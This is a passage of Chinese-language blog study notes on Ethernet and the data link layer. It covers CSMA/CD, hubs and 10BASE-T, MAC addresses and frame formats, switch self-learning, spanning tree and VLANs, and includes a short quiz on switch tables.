以太网取 51.2μs 为争用期的长度。<br>对于 10 Mbit/s 以太网，以太网规定了最短有效帧长为 64 字节，在争用期内可发送 512 bit（即 64 字节）。所以凡长度小于 64 字节的帧都是由于冲突而异常中止的<strong>无效帧</strong>。</p><blockquote><p>这意味着：<br>以太网在发送数据时，若前 64 字节没有发生冲突，则后续的数据就不会发生冲突。</p></blockquote><p>如果发生冲突，就一定是在发送的前 64 字节之内。<br>由于一检测到冲突就立即中止发送，这时已经发送出去的数据一定小于 64 字节。 </p><h4 id="覆盖范围"><a href="#覆盖范围" class="headerlink" title="覆盖范围"></a>覆盖范围</h4><p>在 10 Mbit/s 以太网 51.2 μs 的争用期内，信号能传输多远的距离？</p><p>以太网上最大的端到端单程时延必须小于争用期的一半（即 25.6 μs），这相当于以太网的最大端到端长度约为 5 km。</p><h3 id="强化碰撞"><a href="#强化碰撞" class="headerlink" title="强化碰撞"></a>强化碰撞</h3><blockquote><p>当发送数据的站一旦发现发生碰撞时，除了立即停止发送数据外，还要继续发送32比特或48比特的人为干扰信号，以让所有用户都知道已经发生了碰撞</p></blockquote><p>注意：B 也能够检测到冲突，并立即停止发送数据帧，接着就发送干扰信号。<br>这里为了简单起见，只画出 A 发送干扰信号的情况。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413150301732.png" alt="image-20210413150301732"></p><h3 id="CSMA-CD-协议的重要特性"><a href="#CSMA-CD-协议的重要特性" class="headerlink" title="CSMA/CD 协议的重要特性"></a>CSMA/CD 协议的重要特性</h3><ol><li>使用 CSMA/CD 协议的以太网不能进行全双工通信而只能进行<strong>双向交替通信（半双工通信）</strong>。</li><li>每个站在发送数据之后的一小段时间内，存在着<strong>遭遇碰撞</strong>的可能性。 </li><li>这种发送的不确定性使整个以太网的平均通信量<strong>远小于</strong>以太网的最高数据率。 </li></ol><p>下面是该协议整个过程的流程图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413150725543.png" alt="image-20210413150725543"></p><h2 id="使用集线器的星形拓扑"><a href="#使用集线器的星形拓扑" class="headerlink" title="使用集线器的星形拓扑"></a>使用集线器的星形拓扑</h2><p>传统以太网最初是使用粗同轴电缆，后来演进到使用比较便宜的细同轴电缆，最后发展为使用更便宜和更灵活的双绞线。</p><p>采用双绞线的以太网采用星形拓扑，在星形的中心则增加了一种可靠性非常高的设备，<strong>叫做集线器 (hub)</strong>。</p><p>传统的总线拓扑结构（前面详细讲过了）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413152754451.png" alt="image-20210413152754451"></p><p>使用集线器的双绞线以太网，如下图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413152825307.png" alt="image-20210413152825307"></p><h3 id="星形以太网-10BASE-T"><a href="#星形以太网-10BASE-T" class="headerlink" title="星形以太网 10BASE-T"></a>星形以太网 10BASE-T</h3><p><strong>10BASE-T特点如下</strong></p><ol><li>使用无屏蔽双绞线，采用星形拓扑。</li><li>每个站需要用两对双绞线，分别用于发送和接收。</li><li>双绞线的两端使用 RJ-45 插头。</li><li>集线器使用了大规模集成电路芯片，因此集线器的可靠性提高。 </li><li>10BASE-T 的通信距离稍短，每个站到集线器的距离不超过 100m。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413153048104.png" alt="image-20210413153048104"></p><p>这种 10 Mbit/s 速率的无屏蔽双绞线星形网的出现，既降低了成本，又提高了可靠性。 具有很高的性价比。</p><p>10BASE-T 双绞线以太网的出现，是局域网发展史上的一个非常重要的里程碑，它为以太网在局域网中的统治地位奠定了牢固的基础。从此以太网的拓扑就从总线形变为更加方便的星形网络，而以太网也就在局域网中占据了统治地位。 </p><h3 id="集线器特点"><a href="#集线器特点" class="headerlink" title="集线器特点"></a>集线器特点</h3><ol><li>集线器是<strong>使用电子器件来模拟实际电缆线</strong>的工作，因此整个系统仍然像一个传统的以太网那样运行。 </li><li>使用集线器的以太网<strong>在逻辑上仍是一个总线网</strong>，各工作站使用的还是 <strong>CSMA/CD 协议，并共享逻辑上的总线</strong>。 </li><li>集线器很像一个<strong>多接口</strong>的转发器，工作在物理层。</li><li>集线器采用了专门的芯片，进行自适应串音回波抵消，减少了近端串音。</li></ol><p>结构图如下</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413153248800.png" alt="image-20210413153248800"></p><h2 id="以太网的信道利用率"><a href="#以太网的信道利用率" class="headerlink" title="以太网的信道利用率"></a>以太网的信道利用率</h2><p>多个站在以太网上同时工作就可能会发生碰撞。当发生碰撞时，信道资源实际上是被浪费了。因此，当扣除碰撞所造成的信道损失后，以太网总的信道利用率并不能达到 100%。</p><p>假设я（该符号暂时找不到，所以统一用这个代替一下） 是以太网单程端到端传播时延。则争用期长度为 2я ，即端到端传播时延的两倍。检测到碰撞后不发送干扰信号。</p><p>设帧长为 L (bit)，数据发送速率为 C (bit/s)，则帧的发送时间为  T0 = L/C (s)。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413155601307.png" alt="image-20210413155601307"></p><p>一个站在发送帧时出现了碰撞。经过一个争用期 2я 后，可能又出现了碰撞。这样经过若干个争用期后，一个站发送成功了。假定发送帧需要的时间是 T0。</p><p>通过图我们注意到，成功发送一个帧需要占用信道的时间是 T0 + я，比这个帧的发送时间要多一个单程端到端时延я。<strong>这是因为当一个站发送完最后一个比特时，这个比特还要在以太网上传播</strong>。在最极端的情况下，发送站在传输媒体的一端，而比特在媒体上传输到另一端所需的时间是я 。</p><p>因此，必须经过时间T0 + я后以太网的媒体才处于完全空闲状态</p><p>我们在以太网中定义了参数 a ，它是以太网单程端到端时延я与帧的发送时间 T0 之比： </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413155822743.png" alt="image-20210413155822743"></p><p>通过公式我们可以知道：要提高以太网的信道利用率，就必须减小я与 T0 之比。</p><p>a → 0，表示一发生碰撞就立即可以检测出来， 并立即停止发送，因而信道利用率很高。<br>a 越大，表明争用期所占的比例增大，每发生一次碰撞就浪费许多信道资源，使得信道利用率明显降低。 </p><p>为提高利用率，以太网的参数 a 的值应当尽可能小些。<br>对以太网参数 a 的要求是：当数据率一定时，以太网的连线的长度受到限制，否则я的数值会太大。以太网的帧长不能太短，否则 T0 的值会太小，使 a 值太大。 </p><p>在理想化的情况下，以太网上的各站发送数据都不会产生碰撞（这显然已经不是 CSMA/CD，而是需要使用一种特殊的调度方法），即总线一旦空闲就有某一个站立即发送数据。<br>发送一帧占用线路的时间是 T0 + я ，而帧本身的发送时间是 T0。于是，我们可计算出理想情况下的极限信道利用率 Smax 为： </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413160220692.png" alt="image-20210413160220692"></p><p>只有当参数 a 远小于 1 才能得到尽可能高的极限信道利用率。<br>据统计，当以太网的利用率达到 30% 时就已经处于重载的情况。很多的网络容量被网上的碰撞消耗掉了。</p><h2 id="以太网的-MAC-层"><a href="#以太网的-MAC-层" class="headerlink" title="以太网的 MAC 层"></a>以太网的 MAC 层</h2><h3 id="MAC-层的硬件地址"><a href="#MAC-层的硬件地址" class="headerlink" title="MAC 层的硬件地址"></a>MAC 层的硬件地址</h3><blockquote><p>在局域网中，硬件地址又称为物理地址，或 MAC 地址。 </p></blockquote><p>802 标准所说的“地址”严格地讲应当是每一个站的“名字”或标识符。</p><p>请注意，如果连接在局域网上的主机或路由器安装有多个适配器，那么这样的主机或路由器就有多个“地址”。更准确些说，这种 48 位“地址”应当是某个接口的标识符。</p><p>IEEE 802 标准规定 MAC 地址字段可采用 6 字节 ( 48位) 或 2 字节 ( 16 位) 这两种中的一种。<br>IEEE 的注册管理机构 RA 负责向厂家分配地址字段 6 个字节中的前三个字节 (即高位 24 位)，称为组织唯一标识符。<br>地址字段 6 个字节中的后三个字节 (即低位 24 位) 由厂家自行指派，称为扩展唯一标识符，必须保证生产出的适配器没有重复地址。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413161124465.png" alt="image-20210413161124465"></p><p>所以，一个地址块可以生成 224 个不同的地址。这种 48 位地址称为 MAC-48，它的通用名称是 EUI-48。<br>生产适配器时，6 字节的 MAC 地址已被固化在适配器的 ROM，因此，MAC 地址也叫做硬件地址 (hardware address) 或物理地址。<br>“MAC 地址”实际上就是适配器地址或适配器标识符 EUI-48。</p><h4 id="单站地址，组地址，广播地址"><a href="#单站地址，组地址，广播地址" class="headerlink" title="单站地址，组地址，广播地址"></a>单站地址，组地址，广播地址</h4><p>IEEE 规定地址字段的第一字节的最低位为 I/G 位。I/G 表示 Individual / Group。</p><p>当 I/G 位 = 0 时，地址字段表示一个<strong>单站地址</strong>。</p><p>当 I/G 位 = 1 时，表示<strong>组地址</strong>，用来进行多播（以前曾译为组播）。此时，IEEE 只分配地址字段前三个字节中的 23 位。</p><p>当 I/G 位分别为 0 和 1 时，一个地址块可分别生成 223 个单个站地址和 223 个组地址。</p><p>所有 48 位都为 1 时，为<strong>广播地址</strong>。只能作为目的地址使用。</p><h4 id="全球管理与本地管理"><a href="#全球管理与本地管理" class="headerlink" title="全球管理与本地管理"></a>全球管理与本地管理</h4><p>IEEE 把地址字段第一字节的最低第 2 位规定为 G/L 位，表示 Global / Local。</p><p>当 G/L 位 = 0 时，是全球管理（保证在全球没有相同的地址），厂商向 IEEE 购买的 OUI 都属于全球管理。</p><p>当 G/L 位 = 1 时， 是本地管理，这时用户可任意分配网络上的地址。</p><h4 id="适配器检查-MAC-地址"><a href="#适配器检查-MAC-地址" class="headerlink" title="适配器检查 MAC 地址"></a>适配器检查 MAC 地址</h4><p>适配器从网络上每收到一个 MAC 帧就首先用硬件检查 MAC 帧中的 MAC 地址。如果是发往本站的帧则收下，然后再进行其他的处理。<br>否则就将此帧丢弃，不再进行其他的处理。</p><blockquote><p>“发往本站的帧”包括以下三种帧： </p><ol><li>单播 (unicast) 帧（一对一）</li><li>广播 (broadcast) 帧（一对全体）</li><li>多播 (multicast) 帧（一对多）</li></ol></blockquote><p>所有的适配器都至少能够识别前两种帧，即<strong>能够识别单播地址和广播地址。有的适配器可用编程方法识别多播地址。</strong></p><p><strong>只有目的地址才能使用广播地址和多播地址。</strong></p><p>以<strong>混杂方式 (promiscuous mode)</strong> 工作的以太网适配器只要“听到”有帧在以太网上传输就都接收下来。</p><h3 id="MAC-帧的格式"><a href="#MAC-帧的格式" class="headerlink" title="MAC 帧的格式"></a>MAC 帧的格式</h3><p>常用的以太网 MAC 帧格式有两种标准：<br><strong>DIX Ethernet V2 标准</strong><br><strong>IEEE 的 802.3 标准</strong></p><h4 id="以太网V2标准下的MAC帧"><a href="#以太网V2标准下的MAC帧" class="headerlink" title="以太网V2标准下的MAC帧"></a>以太网V2标准下的MAC帧</h4><p>最常用的 MAC 帧是以太网 V2 的格式。下面就来讲解以太网V2标准下的MAC帧</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413161523396.png" alt="image-20210413161523396"></p><p>其中，目的地址和源地址都是6字节，类型字段用来标志上一层使用的是什么协议，以便把收到的 MAC 帧的数据上交给上一层的这个协议。 </p><p>数据字段的正式名称是 MAC 客户数据字段。<br>最小长度 64 字节 - 18 字节的首部和尾部 = 数据字段的最小长度（46字节） </p><p>当传输媒体的误码率为 1x10-8 时，MAC 子层可使未检测到的差错小于 1x10-14 。 </p><p><strong>注意：当数据字段的长度小于 46 字节时，应在数据字段的后面加入整数字节的填充字段，以保证以太网的 MAC 帧长不小于 64 字节。</strong> </p><p>在帧的前面插入（硬件生成）的 8 字节中，第一个字段共 7 个字节，是前同步码，用来迅速实现 MAC 帧的比特同步。第二个字段 1 个字节是帧开始定界符，表示后面的信息就是 MAC 帧。 </p><p>最后，<strong>为了达到比特同步，在传输媒体上实际传送的要比 MAC 帧还多 8 个字节</strong></p><h4 id="无效的-MAC-帧"><a href="#无效的-MAC-帧" class="headerlink" title="无效的 MAC 帧"></a>无效的 MAC 帧</h4><p>无效的MAC帧主要有以下特点</p><ul><li>数据字段的长度与长度字段的值不一致；</li><li>帧的长度不是整数个字节；</li><li>用收到的帧检验序列 FCS 查出有差错；</li><li>数据字段的长度不在 46 ~ 1500 字节之间。</li></ul><p>有效的 MAC 帧长度为 64 ~ 1518 字节之间。</p><p>怎么解决这些无效的帧，对的，丢掉，前面有提到过</p><blockquote><p>对于检查出的无效 MAC 帧就简单地丢弃。以太网不负责重传丢弃的帧。 </p></blockquote><h4 id="IEEE-802-3-MAC-帧"><a href="#IEEE-802-3-MAC-帧" class="headerlink" title="IEEE 802.3 MAC 帧"></a>IEEE 802.3 MAC 帧</h4><p>下面再来讲讲IEEE 802.3 MAC 帧格式</p><p>与以太网 V2 MAC 帧格式相似，区别在于：</p><ol><li>IEEE 802.3 规定的 MAC 帧的第三个字段是<strong>“长度 / 类型”</strong>。<ol><li>当这个字段值大于 0x0600 时（相当于十进制的 1536），就表示“类型”。这样的帧和以太网 V2 MAC 帧完全一样。</li><li>当这个字段值小于 0x0600 时才表示“长度”。</li></ol></li><li>当“长度/类型”字段值小于 0x0600 时，数据字段必须装入上面的逻辑链路控制 LLC 子层的 LLC 帧。</li></ol><p>让我们再搬出V2 MAC帧的图进行对比</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413161523396.png" alt="image-20210413161523396"></p><blockquote><p>现在市场上流行的都是以太网 V2 的 MAC 帧，但大家也常常把它称为 IEEE 802.3 标准的 MAC 帧。</p></blockquote><p>帧间最小间隔为 9.6 μs，相当于 96 bit 的发送时间。<br>一个站在检测到总线开始空闲后，还要等待 9.6 μs 才能再次发送数据。</p><blockquote><p><strong>这样做是为了使刚刚收到数据帧的站的接收缓存来得及清理，做好接收下一帧的准备。</strong> </p></blockquote><h1 id="扩展的以太网"><a href="#扩展的以太网" class="headerlink" title="扩展的以太网"></a>扩展的以太网</h1><h2 id="在物理层扩展以太网"><a href="#在物理层扩展以太网" class="headerlink" title="在物理层扩展以太网"></a>在物理层扩展以太网</h2><p>有两种方式可以对以太网进行扩展</p><ul><li><p>使用光纤扩展<br>主机使用光纤（通常是一对光纤）和一对光纤调制解调器连接到集线器。 很容易使主机和几公里以外的集线器相连接。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413163939949.png" alt="image-20210413163939949"></p></li><li><p>使用集线器扩展：将多个以太网段连成更大的、多级星形结构的以太网。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413164058671.png" alt="image-20210413164058671"></p></li></ul><p>使用集线器扩展以太网的优缺点有啥</p><p><strong>优点</strong></p><ol><li><p>使原来属于不同碰撞域的以太网上的计算机能够进行跨碰撞域的通信。</p></li><li><p>扩大了以太网覆盖的地理范围。</p></li></ol><p><strong>缺点</strong></p><ol><li>碰撞域增大了，但总的吞吐量并未提高。</li><li>如果不同的碰撞域使用不同的数据率，那么就不能用集线器将它们互连起来。 </li></ol><p>这里的碰撞域是什么意思</p><blockquote><p>碰撞域（collision domain）又称为冲突域，是指网络中一个站点发出的帧会与其他站点发出的帧产生碰撞或冲突的那部分网络。碰撞域越大，发生碰撞的概率越高。</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413165236969.png" alt="image-20210413165236969"></p><p>这样，即使你使用了多个集线器，但其实它们还是属于同个碰撞域，也就是说，在每个碰撞域里只能由一个站再发送数据，这样吞吐量和一个集线器形成的碰撞域是一样的。</p><p>接下来再来讲讲一种更高效的方法——<strong>交换机</strong></p><h2 id="在数据链路层扩展以太网"><a href="#在数据链路层扩展以太网" class="headerlink" title="在数据链路层扩展以太网"></a>在数据链路层扩展以太网</h2><h3 id="以太网交换机"><a href="#以太网交换机" class="headerlink" title="以太网交换机"></a>以太网交换机</h3><p>扩展以太网更常用的方法是在数据链路层进行。早期使用网桥，现在使用以太网交换机。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413165441193.png" alt="image-20210413165441193"></p><p>网桥工作在数据链路层。它根据 MAC 帧的目的地址对收到的帧进行转发和过滤。<br>当网桥收到一个帧时，并不是向所有的接口转发此帧，而是先检查此帧的目的 MAC 地址，然后再确定将该帧转发到哪一个接口，或把它丢弃。 </p><p>以太网交换机实质上就是一个<strong>多接口的网桥</strong>。通常都有十几个或更多的接口。每个接口都直接与一个单台主机或另一个以太网交换机相连，并且一般都工作在<strong>全双工方式</strong>。以太网交换机具有<strong>并行性</strong>。能同时连通多对接口，使多对主机能同时通信。</p><p>相互通信的主机都是独占传输媒体，都能进行无碰撞地传输数据。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413165626642.png" alt="image-20210413165626642"></p><p>这样，以太网交换机的每个接口是一个碰撞域，吞吐量相比较单纯集线器大大提高</p><h3 id="以太网交换机特点、优点"><a href="#以太网交换机特点、优点" class="headerlink" title="以太网交换机特点、优点"></a>以太网交换机特点、优点</h3><p><strong>以太网交换机具有怎样的特点呢</strong></p><ul><li>以太网交换机的接口有<strong>存储器</strong>，能在输出端口繁忙时把到来的帧进行<strong>缓存</strong>。</li><li>以太网交换机是一种<strong>即插即用</strong>设备，其内部的<strong>帧交换表</strong>（又称为地址表）是通过<strong>自学习算法</strong>自动地逐渐建立起来的。</li><li>以太网交换机使用了专用的<strong>交换结构</strong>芯片，用硬件转发，其转发速率要比使用软件转发的网桥快很多。</li><li>以太网交换机的<strong>性能</strong>远远超过普通的集线器，而且价格并不贵。</li></ul><p>通过上面的介绍，让我们来看看以太网交换机具有怎样的优点</p><ol><li><p>用户独享带宽，增加了总容量。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413170307329.png" alt="image-20210413170307329"></p></li><li><p>从共享总线以太网转到交换式以太网时，所有接入设备的软件和硬件、适配器等都不需要做任何改动。</p></li><li><p>以太网交换机一般都具有多种速率的接口，方便了各种不同情况的用户。</p></li></ol><h3 id="以太网交换机的交换方式"><a href="#以太网交换机的交换方式" class="headerlink" title="以太网交换机的交换方式"></a>以太网交换机的交换方式</h3><ol><li><p><strong>存储转发方式</strong><br>把整个数据帧<strong>先缓存后再进行处理</strong>。</p></li><li><p><strong>直通 (cut-through) 方法</strong><br>接收数据帧的同时就立即按<strong>数据帧的目的 MAC 地址决定该帧的转发接口</strong>，因而提高了帧的转发速度。</p><p><strong>缺点</strong>是它不检查差错就直接将帧转发出去，因此有可能也将一些<strong>无效帧</strong>转发给其他的站。</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413170618836.png" alt="image-20210413170618836"></p><p>在某些情况下，仍需要采用基于软件的存储转发方式进行交换，例如，当需要进行线路速率匹配、协议转换或差错检测时。</p><h3 id="以太网交换机的自学习功能"><a href="#以太网交换机的自学习功能" class="headerlink" title="以太网交换机的自学习功能"></a>以太网交换机的自学习功能</h3><p>多图预警，通过多个图来描述以太网交换机自学习过程</p><p>开始时，交换表是空的</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413170859854.png" alt="image-20210413170859854"></p><p>然后A 先向 B 发送一帧。该帧从接口 1 进入到交换机。</p><p>交换机收到帧后，先查找交换表。没有查到应从哪个接口转发这个帧给 B。</p><p>交换机把这个帧的源地址 A 和接口 1 <strong>写入交换表</strong>中。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413170932553.png" alt="image-20210413170932553"></p><p>交换机向除接口 1 以外的所有的接口广播这个帧。</p><p>由于与该帧的目的地址不相符，C 和 D 将丢弃该帧。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413171303606.png" alt="image-20210413171303606"></p><p>B 向 A 发送一帧。该帧从接口 3 进入到交换机。</p><p>交换机收到帧后，先查找交换表。发现交换表中的 MAC 地址有 A，表明要发送给A的帧应从接口1转发出去。于是就把这个帧传送到接口 1 转发给 A。</p><p>交换机把这个帧的源地址 B 和接口 3 写入交换表中。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413171342002.png" alt="image-20210413171342002"></p><p>最后，考虑到可能有时要在交换机的接口更换主机，或者主机要更换其网络适配器，这就需要更改交换表中的项目。为此，在交换表中每个项目<strong>都设有一定的有效时间</strong>。<strong>过期的项目就自动被删除</strong>。</p><blockquote><p>以太网交换机的这种自学习方法使得以太网交换机能够即插即用，不必人工进行配置，因此非常方便。</p></blockquote><p>最后，通过一张图来归纳交换机自学习和转发帧的步骤归纳</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413171701153.png" alt="image-20210413171701153"></p><h3 id="测验"><a href="#测验" class="headerlink" title="测验"></a>测验</h3><p>来啦，小测验</p><p>假设：A 向 B 发送了一帧，C 向 E 发送了一帧，E 向 A 发送了一帧。<br>请分析：此时，S1 和 S2 的交换表内容分别是什么？</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413172314284.png" alt="image-20210413172314284"></p><p>答案如下</p><p>S1表</p><table><thead><tr><th align="center">MAC地址</th><th align="center">接口</th><th align="center">有效时间</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">1</td><td align="center"></td></tr><tr><td align="center">B</td><td align="center">3</td><td align="center"></td></tr><tr><td align="center">E</td><td align="center">5</td><td align="center"></td></tr></tbody></table><p>s2表</p><table><thead><tr><th align="center">MAC地址</th><th align="center">接口</th><th align="center">有效时间</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">5</td><td align="center"></td></tr><tr><td align="center">B</td><td align="center">5</td><td align="center"></td></tr><tr><td align="center">E</td><td align="center">1</td><td align="center"></td></tr></tbody></table><h3 id="回路"><a href="#回路" class="headerlink" title="回路"></a>回路</h3><p>现在来看看交换机存在的一个问题</p><p>假定开始时，交换机 S1 和 S2 的交换表都是空的。<br>主机 A 向主机 E 发送一帧。交换机在没有交换表的情况下会对其进行广播，让我们看看其中一个数据的流动线路情况，从交换机S1接口5出发，到另一个交换机S2，再次广播，其中一条路跑到接口6，然后又跑回交换机S1，再进行广播，其中一条跑到接口5，如此循环下去，便形成了回路</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%9B%9E%E8%B7%AF.gif" alt="交换机回路"></p><p>怎么解决：<strong>生成树协议 STP</strong></p><p>IEEE 802.1D 标准制定了一个<strong>生成树协议 STP  (Spanning Tree Protocol)</strong>。<br>其要点是：不改变网络的实际拓扑，但在逻辑上则切断某些链路，使得从一台主机到所有其他主机的路径是无环路的树状结构，从而消除了兜圈子现象。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413173446655.png" alt="image-20210413173446655"></p><h2 id="从总线以太网到星形以太网"><a href="#从总线以太网到星形以太网" class="headerlink" title="从总线以太网到星形以太网"></a>从总线以太网到星形以太网</h2><p>现在对以太网的发展历程进行总结</p><p>早期，以太网采用无源的总线结构。现在，采用以太网交换机的星形结构成为以太网的首选拓扑。总线以太网使用 CSMA/CD 协议，以半双工方式工作。以太网交换机不使用共享总线，没有碰撞问题，因此不使用 CSMA/CD 协议，以全双工方式工作。但仍然采用以太网的帧结构。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413165441193.png" alt="image-20210413165441193"></p><p> CSMA/CD 协议下的局域网存在的以下几个方面的问题：</p><ol><li>扩展性</li><li>安全性</li><li>可管理性 等</li></ol><p>所有计算机都处于同一个<strong>碰撞域（或冲突域）</strong>中和同一个<strong>广播域</strong>中。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413173722363.png" alt="image-20210413173722363"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413173806387.png" alt="image-20210413173806387"></p><blockquote><p><strong>广播域（broadcast domain）</strong>：指这样一部分网络，其中任何一台设备发出的广播通信都能被该部分网络中的所有其他设备所接收。</p></blockquote><p>若采用以太网交换机的星形以太网</p><p>每个接口都处于一个独立的<strong>碰撞域（或冲突域）</strong>中，但所有计算机都处于同一个<strong>广播域</strong>中。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413174031621.png" alt="image-20210413174031621"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413173947505.png" alt="image-20210413173947505"></p><h2 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h2><p>利用以太网交换机可以很方便地实现虚拟局域网 VLAN (Virtual LAN)。</p><p>IEEE 802.1Q 对虚拟局域网 VLAN 的定义：</p><blockquote><p>虚拟局域网 VLAN 是由一些局域网网段构成的与物理位置无关的逻辑组，而这些网段具有某些共同的需求。每一个 VLAN 的帧都有一个明确的标识符，指明发送这个帧的计算机是属于哪一个 VLAN。</p></blockquote><p><strong>虚拟局域网其实只是局域网给用户提供的一种服务，而并不是一种新型局域网。</strong></p><p>由于虚拟局域网是用户和网络资源的逻辑组合，因此可按照需要将有关设备和资源非常方便地重新组合，使用户从不同的服务器或数据库中存取所需的资源。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413174232906.png" alt="image-20210413174232906"></p><p>这张图中，每个虚拟局域网是一个广播域。VLAN1, VLAN2 和 VLAN3 是三个不同的广播域。</p><p>当 B1 向 VLAN2 工作组内成员发送数据时，工作站 B2 和 B3 将会收到其广播的信息。而VLAN1 和 VLAN3 中的工作站 A1，A2 和 C1 等都不会收到 B1 发出的广播信息。 </p><p>虚拟局域网限制了接收广播信息的工作站数，使得网络不会因传播过多的广播信息 (即“<strong>广播风暴</strong>”) 而引起性能恶化。 </p><h3 id="VLAN优点"><a href="#VLAN优点" class="headerlink" title="VLAN优点"></a>VLAN优点</h3><p><strong>虚拟局域网（VLAN）技术具有以下主要优点：</strong></p><ol><li>改善了性能</li><li>简化了管理</li><li>降低了成本</li><li>改善了安全性</li></ol><h3 id="划分虚拟局域网的方法"><a href="#划分虚拟局域网的方法" class="headerlink" title="划分虚拟局域网的方法"></a>划分虚拟局域网的方法</h3><ul><li>基于交换机端口</li><li>基于计算机网卡的MAC地址</li><li>基于协议类型</li><li>基于IP子网地址</li><li>基于高层应用或服务</li></ul><h4 id="基于交换机端口"><a href="#基于交换机端口" class="headerlink" title="基于交换机端口"></a>基于交换机端口</h4><p>先讲讲基于交换机端口的方法：</p><p>最简单、也是最常用的方法。<br>属于在第一层划分虚拟局域网的方法。<br>缺点：不允许用户移动。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413174534860.png" alt="image-20210413174534860"></p><h4 id="基于计算机网卡的MAC地址的方法"><a href="#基于计算机网卡的MAC地址的方法" class="headerlink" title="基于计算机网卡的MAC地址的方法"></a>基于计算机网卡的MAC地址的方法</h4><p>根据用户计算机的MAC地址划分虚拟局域网。属于在第二层划分虚拟局域网的方法。允许用户移动。</p><p>缺点：需要输入和管理大量的MAC地址。如果用户的MAC地址改变了，则需要管理员重新配置VLAN。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413174643551.png" 